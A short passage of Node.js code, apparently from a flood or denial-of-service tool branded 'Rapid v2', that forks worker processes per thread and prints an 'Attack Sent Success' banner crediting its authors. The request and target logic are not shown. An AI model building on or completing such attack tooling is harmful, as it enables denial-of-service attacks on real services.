...
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
       console.clear()
       console.log(`Rapid v2 | Fish Viruss x Nqn iOS x Zoey | Attack Sent Success`)
       console.log(`Methods Power By : @thanhngocc2806 | Version : 2.0`)
       console.log(`-----------------------------------`)
   }
